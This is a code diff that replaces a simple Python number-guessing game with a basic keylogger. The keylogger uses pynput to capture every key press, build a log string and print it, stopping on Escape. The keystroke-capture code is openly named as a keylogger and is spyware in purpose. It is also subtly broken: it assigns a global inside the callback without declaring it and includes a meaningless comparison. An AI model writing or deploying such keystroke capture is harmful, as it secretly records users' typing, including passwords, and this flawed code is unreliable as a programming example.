@@ -1,21 +1,27 @@
-import random
+import pynput.keyboard              
+from pynput import keyboard        
 
-random_number = round(random.random()*20)
 
-print(str(random_number)[0])
+log = ""
 
-input_number = int(input("Enter a number between 0 with 20:"))
+def callback_function(key): 
+    log = log + str(key)          
 
-while random_number != input_number:
-    if input_number > random_number:
-        print("You entered a large number!")
-    else:
-        print("You entered a small number")
+    if log == "AttributeError":   
+        log + " "
 
-    input_number = int(input("Enter a number between 0 with 20:"))
+    if key == pynput.keyboard.Key.space:        
+        log = log + " "
+    print(log)                   
+      
+    if key == pynput.keyboard.Key.esc:   
+        return False
 
-print("YOU ARE WON!!")
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function) 
 
+
+with keylogger_listener:    
+    keylogger_listener.join() 
 
 
 
